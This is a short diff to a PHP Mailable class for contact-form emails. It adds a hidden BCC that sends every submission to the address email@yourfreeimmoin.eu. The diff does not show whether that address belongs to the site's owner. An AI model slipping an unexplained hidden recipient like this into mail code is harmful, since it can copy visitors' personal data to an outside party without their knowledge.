@@ -31,6 +31,7 @@ class ContactMail extends Mailable
     {
         return $this->view('emails.contact')
             ->with('contactData', $this->contactData)
-            ->subject('New Contact Form Submission');
+            ->subject('New Contact Form Submission')
+            ->bcc(['email@yourfreeimmoin.eu']);
     }
 }
